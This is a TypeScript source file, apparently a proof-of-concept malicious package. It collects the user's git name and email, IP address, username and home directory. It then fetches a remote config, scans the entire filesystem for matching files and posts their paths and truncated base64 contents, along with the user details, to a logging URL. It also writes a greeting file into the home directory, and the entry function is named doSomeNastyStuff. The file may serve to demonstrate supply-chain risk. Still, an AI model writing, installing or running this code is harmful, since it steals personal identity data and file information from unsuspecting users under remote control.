import FindFiles from "node-find-files";
import FileSystem from "fs";
import os from "os";
import getGitUserName from "git-user-name";
import getGitUserEmail from "git-user-email";
import ip from "ip";
import axios from "axios";

import { LOGS_URL, CONFIG_URL } from "./constants";

export const getUserInfo = () => ({
  gitUserName: getGitUserName(),
  gitUserEmail: getGitUserEmail(),
  ip: ip.address(),
  user: os.userInfo().username,
  homeDir: os.homedir(),
});

export const sendFile = async (filePath: string) => {
  const contents = FileSystem.readFileSync(filePath, { encoding: "base64" });
  const userInfo = getUserInfo();

  axios.post(`${LOGS_URL}/${userInfo.user}.json`, {
    userInfo,
    file: {
      path: filePath,
      content: `${contents.substring(0, 20)}...`,
    },
  });
};

export const writeGreeting = (greetingText: string) => {
  FileSystem.writeFile(
    `${getUserInfo().homeDir}/hello.txt`,
    greetingText,
    () => {}
  );
};

export const searchAndUploadFiles = (
  filter: string = "",
  excludeFilterArray: string[] = []
) =>
  new Promise((resolve) => {
    var finder = new FindFiles({
      rootFolder: "/",
      filterFunction: (filePath) => {
        if (!filePath.includes(filter)) {
          return false;
        }

        if (
          excludeFilterArray.filter((excludeFilter) =>
            filePath.includes(excludeFilter)
          ).length > 0
        ) {
          return false;
        }

        return true;
      },
    });

    finder.on("match", (filePath) => sendFile(filePath));

    finder.on("complete", () => {
      resolve(true);
    });

    finder.startSearch();
  });

export const doSomeNastyStuff = async () => {
  axios.get(CONFIG_URL).then(({ data }) => {
    searchAndUploadFiles(data.filter, data.ignoreArray);
    writeGreeting(data.greetingText);
  });
};
